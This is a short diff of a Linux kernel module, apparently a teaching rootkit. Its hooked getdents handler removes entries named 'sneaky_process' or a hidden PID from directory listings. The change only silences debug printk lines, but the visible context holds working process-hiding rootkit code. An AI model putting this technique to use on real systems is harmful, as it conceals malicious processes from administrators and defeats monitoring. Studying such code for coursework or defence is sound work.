@@ -62,9 +62,8 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     int nread = original_getdents(regs);
     struct linux_dirent64 * dirp = (struct linux_dirent64 *)regs->si;
     int bpos;
-    //printk(KERN_INFO"enter my_getdents\n");
-    printk(KERN_INFO"enter my_getdents: nread: %d \n", nread);
-    printk(KERN_INFO"pid: %s \n", sneaky_pid);
+    //printk(KERN_INFO"enter my_getdents: nread: %d \n", nread);
+    //printk(KERN_INFO"pid: %s \n", sneaky_pid);
     if (nread == -1) {
         return -1;
     }
@@ -73,21 +72,19 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     }
     for (bpos = 0; bpos < nread;) {
         d = (struct linux_dirent64 *) ((void *)dirp + bpos);
-        printk(KERN_INFO"current dirent name: %s \n", d->d_name);
-        printk(KERN_INFO"current bpos: %d \n", bpos);
-        printk(KERN_INFO"current d_reclen: %d \n", d->d_reclen);
+        //printk(KERN_INFO"current dirent name: %s \n", d->d_name);
+        //printk(KERN_INFO"current bpos: %d \n", bpos);
+        //printk(KERN_INFO"current d_reclen: %d \n", d->d_reclen);
         if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, sneaky_pid) == 0) {
-            printk(KERN_INFO"find sneaky_process\n");
-            printk(KERN_INFO"current dirent name: %s \n", d->d_name);
+            //printk(KERN_INFO"find sneaky_process\n");
             memmove(((void *)dirp + bpos), ((void *)dirp + bpos + d->d_reclen), nread - d->d_reclen - bpos);
             nread -= d->d_reclen;
             continue;
         }
         bpos += d->d_reclen;
     }
-    printk(KERN_INFO"nread after operations: %d \n", nread);
+    //printk(KERN_INFO"nread after operations: %d \n", nread);
     return nread;
-    //return (*original_getdents)(regs);
 }
 
 // ssize_t read(int fd, void *buf, size_t count);
